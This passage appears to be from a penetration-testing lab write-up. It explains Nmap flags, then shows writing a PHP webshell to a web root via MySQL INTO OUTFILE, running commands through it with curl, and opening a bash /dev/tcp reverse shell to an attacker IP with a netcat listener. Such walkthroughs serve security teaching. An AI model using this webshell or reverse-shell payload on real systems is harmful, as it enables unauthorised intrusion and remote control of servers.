| Option | Meaning | Description |
|--------|---------|-------------|
| `sudo` | Superuser privileges | Required for certain scan types; gives full network access |
| `-sC` | Default script scan | Runs Nmap's standard set of built-in scripts for service enumeration |
| `-sV` | Version detection | Probes open ports to identify service/application versions |
| `-vvv` | Very verbose output (level 3) | Shows maximum detail about scan progress and findings |
| `-Pn` | No ping | Treats target as online without ICMP ping probes (bypasses ping sweeps) |

## The Exploit: Writing a Webshell via MySQL (INTO OUTFILE)
After gaining access to the database, we escalated our access from data manipulation to Remote Code Execution (RCE) using a classic technique: writing a malicious script to the web server.

1. The Concept (SELECT ... INTO OUTFILE)
MySQL provides a function, INTO OUTFILE, normally used to export query results into a file. If the database user has the FILE privilege and we know the web root (which we do, /var/www/html), we can abuse this to write a PHP script directly onto the server.

2. The Malicious Payload
We executed the following SQL command. It writes a simple PHP backdoor (a "webshell") into a new file named rev.php in the web directory

```mysql
SELECT '<?php $cmd=$_GET["cmd"]; system($cmd); ?>' 
INTO OUTFILE '/var/www/html/rev.php';
```

![gambar4](img/rev.php13.png)
The Code: This script takes a command via the URL parameter ?cmd= and executes it on the server's operating system.

3. The Result: Command Execution
With the script uploaded, we used curl (a command-line tool for transferring data) to interact with it, confirming our control:

```bash
curl 10.150.150.145/rev.php?cmd=id
```
![gambar4](img/curlrev.php14.png)

The output uid=33(www-data) confirms the webshell works. The web server runs as the user www-data, which typically has read/write access to the web files.

## Getting a Reverse Shell

With the webshell (`rev.php`) successfully uploaded, we escalated from command execution to an interactive reverse shell for better control.

Step 1: Generating the Reverse Shell Payload

We used Python to URL-encode a standard bash reverse shell payload:

```bash
python3 -c "import urllib.parse; print(urllib.parse.quote('bash -c \"bash -i >& /dev/tcp/<ip address attacker>/<port listener> 0>&1\"'))"
```
```bash
python3 -c "import urllib.parse; print(urllib.parse.quote('bash -c \"bash -i >& /dev/tcp/10.66.67.146/4444 0>&1\"'))"
```

Step 2: Starting the Netcat Listener

Before executing the payload, we set up a listener on our attacking machine
```bash
nc -nlvp 4444
```
![gambar4](img/setportlistener16.png)

Step 3: Executing the Payload via Webshell

We delivered the payload through our rev.php webshell using curl:
```bash
curl "10.150.150.145/rev.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.66.67.146/4444%200%3E%261%22"
```
Note: The IP address 10.66.67.146 is our attacking machine's IP (adjust as needed).
